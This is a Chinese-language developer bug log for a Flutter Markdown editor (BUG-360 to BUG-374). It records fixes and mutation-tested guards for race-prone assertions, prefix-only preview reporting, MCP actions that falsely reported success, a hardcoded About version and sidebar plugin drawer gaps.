把字数统计从 `runes` 改成 `codeUnits`（即按 UTF-16 数）→ RTL 那条红。

### 涉及文件

`test/services/edge_shaped_documents_test.dart`（新增，6 条）

---

## BUG-360：比较同一个变量的两次读数

FEAT-134 那轮我写的守卫，本机绿了很多次，**在 CI 上红了**：

```dart
final said = ResidentMemory.suffix();          // 内部读一次 RSS
expect(said, contains('${ResidentMemory.megabytes()}'),  // 又读一次
       reason: '两处该说同一个数');
```

**两次读的是同一个正在变化的量。** 本机跑单个文件时内存几乎不动；
CI 上前面已经跑了几千条测试，两次读数之间跨过一个 MB 边界，
于是 `' (203 MB resident)'` 不含 `"204"`。

### 这不是"偶发"，是断言本身错了

「两处该说同一个数」这句话对**常量**成立，对 RSS 不成立——
它每一刻都在变，两次读数相等只是**通常如此**。

改成断言**形状**：

```dart
expect(said, matches(RegExp(r'^ \(\d+ MB resident\)$')));
```

这一句要表达的本来就是「能原样接在日志行后面，且带着单位」——
数值相等从来不是它要说的事。

### 又一次「本机绿说明不了 CI」

这个 session 里第二次：BUG-351 是性能测试的阈值，这次是竞态。
两次都是本机连跑五六次全绿之后在 CI 上红的。

**规律：断言里出现两次独立读取同一个可变量时，它就是一个竞态**，
而本机往往测不出来——本机安静，值不动。

变异复验：让 `suffix()` 丢掉单位 → 仍然红。

### 涉及文件

`test/core/diagnostics/resident_memory_test.dart`

---

## 审计：Markdown 标准用法逐个走查（2026-09-08 夜，没有发现缺陷）

> 这一节**不在总览表里**——它不是缺陷记录，是一次查过没改的结论。
> 写下来是为了下次不必重查。

FEAT-135/136 是用「查一个标准用法在这里是否工作」找到的（锚点链接、脚注跳转，
两个都不工作）。同一个方法继续走完，**这次没有再找到缺口**。

| 用法 | 结果 | 守卫 |
|------|------|------|
| HTML 实体 `&amp;` `&#39;` `&lt;` | 解码正确 | `html_escape_test`（变异验证过） |
| 引用式链接 `[text][ref]` | ✓ | `commonmark_spec_test`（变异验证过） |
| 引用式图片 `![alt][ref]` | ✓ | 同上 |
| 简写引用 `[docs]` | ✓ | `shortcut_reference_test` |
| 软/硬换行（无尾空格、两空格、反斜杠） | 三者一致，**都作硬换行** | `fixtures_showcase_test`（变异验证过） |
| 导出的换行 | `<br>`，**与预览一致** | 同上 |
| 有序列表起始编号 `3.` | `<ol start="3">` | `list_export_test` |
| 表格里的转义管道 `\|` | 一个单元格里的字面 `\|` | `delimiter_in_content_test` |
| 三重强调 `***x***` | `<em><strong>` | 解析器测试 |
| 缩进代码块（四空格） | ✓ | 同上 |

### 一个有意的选择，值得记下来

**所有换行都当硬换行**（CommonMark 说无尾随空格的换行应折成空格）。
这对一句一行的中文写作是对的选择，**而且预览与导出说的是同一件事**——
后者才是关键：本文档修过多次「预览和导出不一致」。

### 五个变异

实体不解码、引用式链接不解析、导出丢掉 `<br>`——三个都被现有守卫抓住，
各自有专门的测试文件。这轮**没有改动任何代码**。

---

## BUG-361：耗时日志把前缀当成整篇

| 字段 | 内容 |
|------|------|
| 编号 | BUG-361 |
| 日期 | 2026-09-09 |
| 优先级 | P2 |
| 状态 | 已修复 |

### 现象

实机上打开四篇同样形状、只是长短不同的文档，日志给出：

| 文档 | 整篇应有 | 日志说画了 |
|------|---------|-----------|
| 16 KB | 121 块 | 121 块 / 93 ms |
| 74 KB | 541 块 | 541 块 / 507 ms |
| 312 KB | 2281 块 | **377 块 / 406 ms** |
| 986 KB | 7201 块 | 7201 块 / 6986 ms |

中间那篇报的是六分之一。更麻烦的是它不稳定：另一篇同样 380 节、只是每节行数不同的
文档，报的是完整的 2281 块。同一种文档两次测量能给出两个数，而日志上看不出差别。

### 根因

超过 1500 行（或 200 KB）的文档分两次解析：先解析一段前缀让首屏有东西，
再整篇替换。渐进填充按批次画，画满**当前节点表**就调用 `_finishedFilling`
报出耗时并把秒表置空。

只有前缀时，「当前节点表」就是前缀。于是两件事在赛跑：

- 前缀填满 → 报出前缀的块数和前缀的耗时，秒表置空
- 整篇解析送达 → 节点表变长，填充继续，**已经没有秒表可报**

谁先到就决定日志说什么。而 `safePrefix` 只对大文档返回前缀——**这条诊断唯一存在
意义的场合，正是它说假话的场合**；小到能一次解析完的文档从不走这条路，所以它们的
数字一直是对的，看起来一切正常。

这是本库反复出现的那一类：编辑器说了与事实不符的话。

### 为什么原有守卫没拦住

`preview_reports_its_cost_test` 用的是 300 段、300 行的文档——**没越过 1500 行
那条线**，两条路里只走过不分块的那条。规模不够，分块路径一次都没被执行过。

### 修复方案

加一个字段记住「整篇还欠着」，欠着时 `_finishedFilling` 不报：

- `_awaitingFullParse` 回答不了这个问题：它在请求另一个 isolate **之前**就被清空，
  中间那段窗口里只有前缀，而没有任何东西这么说
- 取前缀时立起 `_fullParseOwed`，`_adoptFullParse` 采纳整篇时放下
- 其余分支不清它——每次文档变化时 build 都会重新赋值，不会残留

### 涉及文件

- `lib/ui/editor/markdown_renderer.dart`
- `test/ui/editor/preview_reports_its_cost_test.dart`

### 验证

新增两条测试，互为另一半：

1. 「分两次解析的文档不报第一次」——800 段（1599 行）越过 `safePrefix` 的线。
   撤销修复后报 `751 blocks`，而文档有 800 块
2. 「整篇到了之后要报」——用 `runAsync` 让另一个 isolate 真的跑完。
   没有这一条，一个「对大文档干脆闭嘴」的实现也能通过第一条，
   那和报前缀是同一个洞：读日志的人两种情况下都什么也没学到

变异验证：撤销修复 → 两条都红；把 `_finishedFilling` 对大文档改成直接返回 →
只有第二条红。

---

## BUG-362：预览在只画完前缀时就宣称画完了

| 字段 | 内容 |
|------|------|
| 编号 | BUG-362 |
| 日期 | 2026-09-09 |
| 优先级 | P3 |
| 状态 | 已修复 |

### 现象

超过 1500 行的文档分两次解析。第一次只有前缀，而预览里有两样东西宣布
「就这么多了」：

- 底部的加载指示器**消失**
- 「点这里接着写」的落点**出现**

两者都在前缀的末尾触发——对一篇 2281 块的文档，是在第 751 块之后，
下面还有 1530 块正在解析。读者滚到那里看到的是一篇画完了的、短了六分之五的文档。

### 根因

两处判断都拿 `_renderedNodeCount` 和**当前节点表**的长度比：

```dart
if (widget.onSourceChanged != null && _renderedNodeCount >= nodes.length)
if (_renderedNodeCount < nodes.length)
```

只有前缀时，「当前节点表」就是前缀，它的末尾不是文档的末尾。

这是 BUG-361 的兄弟：同一个「拿现在有的当作全部」，一个体现在日志上，
一个体现在界面上。是查完 BUG-361 后横向读兄弟分支找到的。

### 不是什么

**没有数据损坏。** 落点被点击时，`_startEditingAtEnd` 取的是
`widget.markdown` 的行数——真正的文末，不是最后一个已解析块的位置。
所以在那个窗口里写字，内容仍然追加到文档末尾。错的只是**画在哪里**。

### 修复方案

复用 BUG-361 加的 `_fullParseOwed`：欠着整篇时，指示器不收、落点不画。

### 涉及文件

- `lib/ui/editor/markdown_renderer.dart`
- `test/ui/editor/preview_admits_it_is_unfinished_test.dart`（新增）

### 验证

三条测试，第二条是防「反过来坏掉」的另一半：

1. 整篇未到时，指示器还在（撤销修复：找到 0 个）
2. 一次解析完的文档（300 段，未越 1500 行）**要**收起指示器
   ——否则一个「永远转圈」的实现也能通过第 1 条
3. 整篇未到时，不画追加落点（撤销修复：找到 1 个）

---

## BUG-363：图表画空了没人发现

| 字段 | 内容 |
|------|------|
| 编号 | BUG-363 |
| 日期 | 2026-09-09 |
| 优先级 | P2 |
| 状态 | 已加守卫（未发现现存缺陷） |

### 问题

22 种图表类型有两条「对账式」守卫：每种类型都有样例、每种类型都能画出来。
问一句**「什么样的损坏会让它们保持全绿？」**——答案是「图画空了」：

`every_type_draws_test` 验的是没抛异常、没报错、不停在转圈、有面积、有画布。
**一张空白画布也有面积**。

`MermaidParseResult.hasContent` 也堵不住：它问的是 payload 对象**构造出来没有**，
不是里面**有没有东西**。一个建了空 `TimelineChartData` 的解析器满足它。

### 实测

把 22 种样例各解析一遍、数 payload 里的实际条目，**结果全部与样例吻合**
（flowchart 4 节点 3 边、sankey 3 条链接、blockDiagram 3 个块……）。
解析器本身没有缺陷，缺的是守卫。

用变异确认这个空白有多大：

| 变异 | 除新守卫外，全套 mermaid 测试 |
|------|------------------------------|
| timeline 三个事件只留一个 | 红（4 条既有测试抓住） |
| **radar 三根轴只留一根** | **全绿** |
| **xyChart 丢掉唯一的数据系列** | **全绿** |

radar 和 xyChart 在整个 mermaid 测试目录里**没有任何内容级断言**——
把图画成全空，没有一条测试会红。

### 修复方案

新增 `every_type_keeps_its_content_test`：每种类型解析样例后，
数出的条目数必须等于样例里写的条目数。数字是从 `mermaid_samples.dart`
读出来的，**故意**构成需要与样例保持一致的第二份清单——改样例时应当有人
去看看解析器现在从里面得到了什么。

同时有一条「每种实现的类型都必须在这里有期望值」，新增图型不能悄悄跳过。

### 涉及文件

- `test/ui/editor/mermaid/every_type_keeps_its_content_test.dart`（新增）

### 两处扫描教训

这一条是从「声明后全库只出现一次的名字」查 `timeline.allEvents` 顺出来的，
路上犯了两个同类的扫描错误：

1. `grep scrollOffset` 漏掉 `sourceScrollOffset` —— **camelCase 的词边界**
2. `find test -iname '*timeline*'` 什么也没找到，就断定「时间线一条测试都没有」
   —— 实际有四条，住在 `mermaid_parser_test.dart` 里。**按文件名找不等于按内容找**

---

## BUG-364：窗口动作只被点名，从没被执行

| 字段 | 内容 |
|------|------|
| 编号 | BUG-364 |
| 日期 | 2026-09-09 |
| 优先级 | P2 |
| 状态 | 已加守卫（未发现现存缺陷） |

### 问题

BUG-330 是 P0：十一个快捷键画在菜单里、能在设置里重绑、按下去毫无反应。
修法是把它们收进一份清单 `WindowActions`，并加 `window_action_coverage_test`
两个方向对账。

对这条守卫再问一次「什么损坏会让它全绿」——答案是**同一个缺陷深一层**：

```dart
WindowAction('zoomIn', (_, __) {}),                        // 在清单里、能绑、有标签、什么都不做
WindowAction('zoomOut', (_, ref) => _zoomBy(ref, 2)),      // 缩小写成了放大
```

守卫比的是**名字在不在清单里**，不是**跑起来做不做事**。
全代码库没有任何测试执行过 `WindowAction.run`——25 个动作的行为一个都没被验过。

### 实测

| 变异 | `window_action_coverage_test` | 全套 2855 条 | 新守卫 |
|------|------------------------------|-------------|--------|
| `zoomIn` 改成空函数 | 绿 | **只有新守卫红** | 红 |
| `zoomOut` 接成放大 | 绿 | — | 红 |
| `findPrevious` 接成向前找 | 绿 | — | 红 |
| 新增一个动作，既不测也不说明 | 绿 | — | 红 |

### 修复方案

新增 `window_actions_do_something_test`：真的构造 `BuildContext` 与
`WidgetRef`，把动作跑一遍，断言 Riverpod 状态里对应的东西变了。

**15 个可以执行**（三种视图模式、四个开关、三个缩放、查找栏四项、重载图片），
**10 个造不出条件**（开文件选择器、启动进程、关窗口、系统打印框……）——
后者逐个写明理由，并有一条对账：**已测集 ∪ 明示不可测集必须等于全部动作名**，
两个方向都查。新增动作若两边都不提，直接红。

方向也验：`zoomIn` 必须变大、`zoomOut` 必须变小、`findNext/findPrevious`
的 `findStepForward` 必须相反。只断言「状态变了」挡不住接反。

### 一处自己踩到的坑

第一版用 `covers(name)` 在测试体里累积「已测集」。**单独跑那条对账测试时集合是空的，
它会假红**——一条只有跑全文件才成立的测试，会教人不相信它。
改成从同一份数据声明式推导，与执行顺序无关。

### 涉及文件

- `test/ui/window_actions_do_something_test.dart`（新增）

---

## BUG-365：格式动作接到哪个处理，没人验过

| 字段 | 内容 |
|------|------|
| 编号 | BUG-365 |
| 日期 | 2026-09-09 |
| 优先级 | P2 |
| 状态 | 已加守卫（未发现现存缺陷） |

### 问题

BUG-364 守的是键位表的一半（`WindowActions`）。**另一半是 `FormatAction`**——
`window_action_coverage_test` 的 `isCarriedOut` 认的就是这两者。
按「改一个分支就读完它的兄弟」，同样的问题该问它。

好消息先说：分发它们的 `switch` **没有 `default` 且穷尽 52 个成员**，
编译器已经保证「每个都被处理」，BUG-330 的那一半在这里回不来。

编译器看不见的是**它被给了哪个处理**：

```dart
case FormatAction.quoteBlock:
  _applyLinePrefixAtCursor('* ');    // 能编译、能绑、菜单上画着，写出的是圆点
case FormatAction.promoteHeading:
  _shiftHeadingLevel(1);             // 提升写成了降级
```

52 个动作里 **25 个在测试里从没被点名**。委托的帮助函数（前缀、标题升降、表格编辑）
各自有测试，**从动作到参数的那一根线没有**。

### 实测

| 变异 | 全套 2870 条测试 |
|------|-----------------|
| `quoteBlock` 的前缀写成 `* ` | **全绿** |
| `promoteHeading` 接成 `_shiftHeadingLevel(1)` | **全绿** |

### 修复方案

新增 `format_actions_do_something_test`：真的把动作跑进一个 `SourceEditor`，
比对产出的文档全文。一张「输入 / 选区 / 期望输出」的表驱动 52 条断言。

**期望值全部实测得来，一个都没猜**。这很要紧——先探到的两处「巧合」正说明猜会出错：

- 单数据行的表格上，`tableInsertRowBelow` 与 `tableInsertRowAbove` **产出相同**
- 两个段落时，`moveBlockUp` 与 `moveBlockDown` **产出相同**

两者当时都是对的，但用那样的输入写断言，接反了照样通过。
改用**三行数据、光标在中间**和**三个段落、光标在中段**，两个方向才分得开。

同样有两方向对账：已测集 ∪ 明示不可测集（`copyAsMarkdown`/`copyAsHtml`，
它们写剪贴板不改文档）必须等于 `FormatAction.values`。

### 验证

五次接线变异，全部被抓住：引用块前缀、标题升降方向、表格插行方向、
表格对齐方式、块移动方向。

### 涉及文件

- `test/ui/editor/format_actions_do_something_test.dart`（新增）

---

## BUG-366：关掉和写入一个不存在的标签，都回报成功

| 字段 | 内容 |
|------|------|
| 编号 | BUG-366 |
| 日期 | 2026-09-09 |
| 优先级 | P2 |
| 状态 | 已修复 |

### 现象（实机，正在运行的版本）

```
control close_tab  tabId=definitely-not-a-tab
  → "closed tab definitely-not-a-tab"          isError: false

control set_content tabId=definitely-not-a-tab
  → "wrote 1 characters to definitely-not-a-tab"  isError: false
```

两个都没有这个标签可关、可写，两个都说自己做到了。

### 根因：修了两个分支，留下两个兄弟

同一个 `switch` 里的四个动作，两两不同：

| 动作 | 底层方法 | 返回 | 回报 |
|------|---------|------|------|
| `activate_tab` | `setActiveTab` | `bool` | 真实 |
| `close_pane` | `PluginPanes.close` | `bool` | 真实 |
| **`close_tab`** | `removeTab` | **`void`** | **无条件成功** |
| **`set_content`** | `updateContent` | **`void`** | **无条件成功** |

前两个正是上一版修过的（发行说明写着「会为它没有切过去的标签、没有关掉的窗格
回报成功」）。修的时候只动了那两个分支，**没有横向读一遍同一个 switch 里的兄弟**。

`removeTab` 用 `where` 过滤、`updateContent` 用 `map` 映射——两者对一个不存在的
id 都是**安静的空操作**，而调用处把「没抛异常」当成了「做成了」。

### 为什么测试没发现

`mcp_action_test` 覆盖的是外围：枚举、wire name、由枚举生成的 schema、
outcome 到协议应答的映射。它给 toolset 传的 `perform` 是一个**桩**——
真正那个 switch（一个 agent 能请求的全部动作）**从没有被任何测试执行过**。

### 修复方案

- `removeTab` 与 `updateContent` 改为返回 `bool`，先查这个 id 在不在
- `_perform` 改为转述它们的答案，与 `activate_tab` / `close_pane` 一致
- `_perform` 更名 `performAction` 并加 `@visibleForTesting`，让 switch 可被执行

调用方不受影响：Dart 里忽略返回值是合法的，全套 2932 条通过。

### 涉及文件

- `lib/providers/tab_provider.dart`
- `lib/providers/mcp_provider.dart`
- `test/services/mcp_control_does_it_test.dart`（新增，10 条）

### 验证

新守卫把 7 个动作全部跑过一遍（含成功与被拒两路）。变异两次——
把任一处改回无条件成功——**只有这个新文件红，其余全套全绿**。

### 顺带记下：插件那边查过了，没问题

同一轮里对官方插件做了两次变异：`on_command` 不再分派 `ai.write`
（兜底会把它变成翻译）、manifest 里删掉一条菜单。前者 6 条红、后者 1 条红，
**插件的跨仓库对账是有效的**。唯一过时的是一条测试名——
「it contributes both commands」，而 manifest 现在声明四个。

---

## BUG-367：agent 看到的那幅图，没人核对过

| 字段 | 内容 |
|------|------|
| 编号 | BUG-367 |
| 日期 | 2026-09-09 |
| 优先级 | P3 |
| 状态 | 已加守卫（未发现现存缺陷） |

### 问题

BUG-366 的信号是「测试给这一层传了桩，真正那一层就从没被跑过」。
把这个信号扫一遍 `lib/`，找出 19 处以函数字段作接缝的类，
最像的一处就在**同一个文件、同一个类**里：`describeState` → `_describe`，
也就是 `get_state`。

`get_state` 是 agent 建立全部判断的那幅图，而它同样只被桩替代过。
它也有前科：BUG-352 就是 `get_state` 报出四个插件命令、
`run_plugin_command` 一个都不接，因为两者读的是 manifest 的**不同字段**。

### 实机审计（先做的，结果是干净的）

用 MCP 对着运行中的编辑器逐项核对 `get_state`：字符数、视图模式、
活动标签、modified 标志、关掉的标签是否消失、报出的插件命令是否被接受。

**没有发现新问题。** 其中两项看起来像缺陷，核对代码后确认是**旧构建的表现**，
`dev` 上早已修好：

| 实机现象 | 结论 |
|---------|------|
| `run_plugin_command` 答「it has 」后面空着 | BUG-352，已修（现在两边同用 `commandIds`） |
| 拒绝时 `isError` 为 false | 已修（`isError: !outcome.ok`） |

> 顺带说明：用户机器上跑的构建早于 `42bf07d`，这两处才会出现。

### 修复方案

把实机那份审计做成可重复的：`_describe` 更名 `describeState` 并加
`@visibleForTesting`，新增 9 条断言覆盖 agent 依赖的每个字段。

其中一条专门盯住工具说明里的承诺：**`characters` 是 UTF-16 码元，不是码点**。
测试文档特意选了 `a𝄞中\n`（4 个码点、5 个码元），并断言两者**确实不等**——
否则这条测试什么也没证明。

### 验证

三次变异，各被对应的一条抓住，**全套里没有别的测试拦得住**：

| 变异 | 唯一红的 |
|------|---------|
| `characters` 改用码点 | 「characters are the UTF-16 units…」 |
| 插件页一律报成 document | 「a plugin page is not reported as a document」 |
| `commands` 改读别的字段（BUG-352 原形） | 「the commands it names are…」 |

### 涉及文件

- `lib/providers/mcp_provider.dart`（`_describe` → `describeState`）
- `test/services/mcp_state_is_true_test.dart`（新增，9 条）

---

## BUG-368：「关于」显示的是五个版本前的号码

| 字段 | 内容 |
|------|------|
| 编号 | BUG-368 |
| 日期 | 2026-09-09 |
| 优先级 | P2 |
| 状态 | 已修复 |

### 现象

帮助 → 关于，显示 **v1.0.1**。应用是 **1.6.1**。

这是**唯一一个**读者主动打开来确认「我装的是哪一版」的地方。

### 根因

```dart
applicationVersion: 'v1.0.1',     // 写死
```

全代码库唯一一处写死的版本号。`pubspec.yaml` 与 `AppConstants.appVersion`
一直保持同步，只是**没人读它**。

### 守卫为什么没拦住：它自己的注释就是那句假话

`app_version_test` 的开头写着：

> It is written twice — `version:` in pubspec.yaml, which names the build, and
> `AppConstants.appVersion`, **which About shows** and the update check
> compares against.

「which About shows」——**从来不成立**。守卫比对了版本**应该**待的两个地方，
却假定显示它的那个界面读的是其中之一，从没核对过。

更能说明问题的是它记的历史：当年 issue #1 就是「About 报出的版本对不上任何发行版」，
有人把常量改对当作修好了——而 About 压根没读那个常量。

这是本库第三条排查视角的又一例：**一份清单对外宣称，另一份是实现，没人比较它们**。

### 修复方案

1. `applicationVersion: 'v${AppConstants.appVersion}'`
2. 把对话框抽成具名的 `AppMenuBar.showAbout()`，让测试能真的打开它

### 两条守卫，各管一段

| 守卫 | 抓什么 |
|------|--------|
| `app_version_test`「nothing else writes a version out by hand」 | `lib/` 里任何写死的三段版本号（排除常量文件与生成的本地化） |
| `about_says_this_version_test` | **真的打开对话框**，断言它显示 `v${appVersion}` |

变异验证两者分工：

| 变异 | 源码扫描 | 打开对话框 |
|------|---------|-----------|
| 版本又写死 | 红 | 红 |
| **不写死，但根本不传版本** | **绿** | **红** |

第二种正是扫描看不见的那类——所以两条都要。

### 涉及文件

- `lib/ui/widgets/app_menu_bar.dart`
- `test/core/app_version_test.dart`
- `test/ui/widgets/about_says_this_version_test.dart`（新增）

---

## BUG-369：右侧栏给得出答案，却没有办法采用

| 字段 | 内容 |
|------|------|
| 编号 | BUG-369 |
| 日期 | 2026-09-09 |
| 优先级 | P1 |
| 状态 | 已修复 |
| 报告人 | 用户（「AI 助手插件的右侧边栏图标功能一直都有问题」） |

### 现象

点右侧栏的 AI 助手图标 → 抽屉里问「要我怎么写」 → 回答 → AI 写出结果 →
**你能看到那段文字，却没有任何办法把它放进文档**。

同一个命令从右键菜单走，结果窗格上是有「采用」按钮的。

### 根因

抽屉与窗格拿到的东西不一样：

```dart
typedef PluginTextSink = void Function(String text, {bool append});
```

插件返回的是一整个 `PluginPaneAction`，其中 `apply = true`（这段可以采用）、
`replaces = "..."`（它替换的是哪段原文）。窗格那条路读这两个字段，在
`plugin_panes.dart:421` 画出按钮；**而侧边栏这条路的 sink 只有文本，
其余全部丢在地上**。

于是同一个插件、同一个命令，从菜单走能用，从侧栏走只能看。

### 为什么一直没被发现

**MCP 够不到这条路。** `run_plugin_command` 调的是
`PluginCommandActions.run`（菜单栏那条），侧边栏走的是 `runInto`，
两者传的 sink 不同。`control` 也没有「点击侧栏图标」的动作。

自动化测的一直是另一条路，所以本机全绿、实机有问题。

### 修复方案

1. `PluginTextSink` 加上 `canApply` 与 `replaces`（都有默认值，其余调用点不受影响）
2. 「采用」的实现从 `plugin_panes.dart` 里抽出为 `PluginApply.into(...)`，
   两条路共用一份——**不是抄一份到侧边栏**
3. 抽屉在 `canApply` 时画出同一个按钮；采用成功后关闭抽屉，
   与窗格被采用后关闭的行为一致

### 验证

两条测试，装一个真的 Lua 插件、真的点图标：

1. 插件说 `apply = true` → 抽屉里必须有 `plugin-drawer-apply`
2. 插件只是展示 → **必须没有**那个按钮（否则会拿一段只读文本去覆盖文档）

变异（抽屉又把 `canApply` 丢掉）：**只有第 1 条红，全套其余全绿**。

---

## BUG-370：右侧栏还丢了另外两样

| 字段 | 内容 |
|------|------|
| 编号 | BUG-370 |
| 日期 | 2026-09-09 |
| 优先级 | P1 |
| 状态 | 已修复 |

### 怎么找到的

BUG-369 的形状是「抽屉丢掉了插件对这段文字说的话」。**插件说的不止 `apply` 一件**，
把窗格用到的字段和抽屉用到的逐个对照：

| 窗格用 | 抽屉用 | |
|--------|--------|---|
| `text` | ✓ | |
| `canApply` / `replaces` | ✓ | BUG-369 刚补 |
| **`render`** | ✗ | 本条 |
| **`busy`** | ✗ | 本条 |
| `title` | ✗ | 抽屉用面板自己的标题，合理 |

### 现象一：Markdown 原样显示

官方插件传的是 `as = view_of(ctx)`——你在**预览模式**下读，它就要求结果按
Markdown 渲染。窗格照办（`MarkdownRenderer`），**抽屉是 `SelectableText`**，
于是你看到的是 `## 标题`、`**粗体**` 这样的原始标记。

### 现象二：等模型时毫无动静

窗格在等模型时有转圈（`busy && text.isEmpty` 时居中，已有部分内容时在下方），
**抽屉什么都没有**。你回答完问题，对着一个空抽屉干等——
和「它失败了」看起来一模一样。

### 修复方案

- sink 再带上 `render`，抽屉按它选 `MarkdownRenderer` 还是 `SelectableText`
- **忙态不走 sink**：抽屉自己知道 `runInto` 还在不在执行，
  这比把窗格的 `busy` 转运过来更准——答案正是那个 await 在等的东西。
  `finally` 里复位，无论结束、被拒还是抛异常
- 还在跑时不给「采用」按钮，与窗格的 `canApply && !busy` 一致

### 验证

两条测试互为另一半：插件要求 `as = "preview"` → 抽屉里 `# Heading` 必须**消失**
（被渲染成标题）；插件不作要求 → `# Heading` 必须**原样保留**
（否则读者拿它和自己的源码对照时看不到标记）。

变异两个方向（一律纯文本 / 一律渲染）各被对应的一条抓住。

---

## BUG-371：切回分屏标签，两半错开

| 字段 | 内容 |
|------|------|
| 编号 | BUG-371 |
| 日期 | 2026-09-09 |
| 优先级 | P1 |
| 状态 | 已修复 |
| 报告人 | 用户（「双栏模式的滚动有问题」） |
| 引入于 | FEAT-137（切标签记住滚动位置） |

### 现象

分屏模式下读到文档中间 → 切到别的标签 → 切回来：
**源码窗格回到了你读的地方，预览还停在顶部。** 两半错开，看起来就是「滚动坏了」。

### 根因：时序，不是逻辑

分屏里源码窗格拥有位置、预览跟随。FEAT-137 让源码窗格在自己的
post-frame 回调里恢复位置，恢复时会上报当前行——

**但预览要到它自己的 post-frame 才注册监听。** 左边的窗格先构建、
它的回调也先跑，那一次上报落地时**还没有人在听**。此后两边都不动，
于是一直错开到你手动滚动为止。

同一个文件里，`targetScrollLine` 早就处理过这个问题，注释写得很清楚：

> A request made before this widget existed — the search panel opening a file
> and asking for its line in one breath — never reaches the listener above,
> which only fires on a change. Honour whatever is already pending.

**预览跟随这条漏了这一步。**

### 修复方案

预览注册监听之后，先读一次 `syncSourceLine` 的当前值并跟过去——
与上面 `targetScrollLine` 的处理一致。

### 验证

新增 `split_scroll_follows_test`，**分屏滚动同步此前一条测试都没有**：

1. 两半都有得滚（否则下面的断言是零比零）
2. 滚源码，预览跟过去
3. 滚预览，源码跟过去
4. **两者不会互相追**——停手后再等一秒，两边都不能自己动
5. 切走再切回，两半仍在同一处（本条缺陷）

变异（去掉补听）：**只有第 5 条红，全套其余全绿**。

---

## BUG-372：输入框收下要求，却没有地方送

| 字段 | 内容 |
|------|------|
| 编号 | BUG-372 |
| 日期 | 2026-09-09 |
| 优先级 | P2 |
| 状态 | 已修复 |
| 引入于 | FEAT-141（右侧栏改成对话形式），同一天 |

### 问题

FEAT-141 让追加的要求**作为「插件那个问题的回答」**送进去——这正是不用改插件
就能实现的关键。但**并非每个命令都问问题**：官方插件的 `ai.proofread`
就是直接送去模型，一句也不问。

那样的面板，输入框照样摆出来，你打的字**没有任何地方可去**，
静默丢弃。这就是「编辑器说了与事实不符的话」：摆出一个能做某事的样子，
而它做不到。

### 为什么当天没发现

`panels` 里目前只有 `ai.write`，而它**会**问。功能对现有配置是对的，
洞要等有人把不提问的命令做成面板才会显形——那时它已经在用户手里了。

发现办法是回头问自己一句：**「追加的要求是怎么传进去的？那如果没有这条路呢？」**

### 修复方案

记下这一轮**是否真的被问过**（`onAsk` 被调用即为真），只有问过才提供输入框。
开新面板时复位。

### 验证

新增一条：面板的命令不问问题时，抽屉里**不该**出现输入框。
两向变异各被抓住——一律给（原缺陷）红，一律不给（把会问的也挡掉）也红。

---

## BUG-373：宿主变了行为，SDK 没跟着说

| 字段 | 内容 |
|------|------|
| 编号 | BUG-373 |
| 日期 | 2026-09-09 |
| 优先级 | P3 |
| 状态 | 已修复并加守卫 |

### 问题

FEAT-141 之后，**面板的命令可能被再次调用，而且 `ctx.selection` 是它自己上一次的
答案**。这是插件作者必须知道的事：把选中文字当作「要处理的那部分」的命令什么都
不用改，而忽略 `ctx.selection` 的命令会一次次从整篇文档重写。

SDK 的 README 对此只字未提——宿主的行为变了，对外的契约没跟上。

### 修复方案

在 `## How a script plugin is called` 下新增 `### A panel may be asked again`，
**12 种语言齐备**。做成三级标题是有意的：形状守卫数 `###`，
于是它自己就会强制每份翻译都带上这一节。

### 守卫，以及第一次写错的地方

形状守卫只保证「有这个标题」，不保证「它讲的是那件事」——BUG-353 就是这么漏的。
所以另加一条内容守卫，用**不翻译的字段名**对账。

**第一版写错了**：断言「文件里出现 `ctx.selection` 至少两次」。
实测这两个字段在每份 README 里本来就出现 **8 次和 12 次**——
判据查得太宽，变异（把中文那节挖空）照样全绿，等于什么都没测。

改成**只在那一小节内部查**（按第五个 `###` 到第六个之间取），并给守卫加一道锚：
英文那节必须仍含 `asked again`，否则说明有人在前面加了三级标题、
取法已经错位——那时守卫会直接说出来，而不是继续检查别的小节还报绿。

变异验证：

| 变异 | 形状守卫 | 新的内容守卫 |
|------|---------|-------------|
| 中文那节写成「待补充」 | **绿** | 红 |
| 英文标题改名（锚失效） | 绿 | 红，并说明取法要改 |

---

## BUG-374：「两边读的名字一样」，其实只查了四个

| 字段 | 内容 |
|------|------|
| 编号 | BUG-374 |
| 日期 | 2026-09-09 |
| 优先级 | P3 |
| 状态 | 已加守卫（未发现现存缺陷） |

### 问题

脚本动作有**两份解析实现**：`plugin_script_runtime.dart`（Lua）与
`plugin_js_runtime.dart`（JS）。SDK 对外承诺「the same shape in JavaScript」。

已有一条守卫叫 `JS reads the same field names as Lua`——**它查的是手写的四个
名字**（`apply`、`replaces`、`append`、`ai`）。加第五个键时它不会跟着长，
而这正是它的标题声称要拦的那种漂移。

另一条 `sdk_definitions_test` 把 **Lua** 运行时读的键与定义文件对账，
**从没对过 JS 那一份**。

### 实测：两边今天是一致的

逐键对照后确认两个运行时读的键完全相同（`diff` 的形状看着不同，
实则 `getField(-1,'diff')` 已把子表压栈，`_field('original')` 读的正是
`diff.original`，与 JS 的 `diff['original']` 等价）。**没有现存缺陷。**

### 修复方案

把那条守卫改成**从代码推导**：分别抽出两个文件读取的键名，双向求差。
取代原来手写的四个名字，标题不变——现在它名副其实了。

### 一轮里被扫描口径骗了三次

写这条守卫时，我的正则先后报出「九个键只有 Lua 有」「一个键（`spacer`）
只有 Lua 有」，逐个进文件确认后**全是取法的盲区**，不是运行时真的漏读：

| 漏掉的写法 | 例子 |
|-----------|------|
| 键名作为辅助函数的参数 | `string(node, 'placeholder')`、`flag(node, 'primary')` |
| 用 `containsKey` 而非下标 | `raw.containsKey('spacer')` |

**扫描报出差异时，先怀疑取法。** 这一条连同「扫描的否定结果不是证据」
一起写进了守卫的注释里。

### 验证

三向变异全部抓住：JS 忘接一个键、JS 多认一个键、Lua 多认一个键。
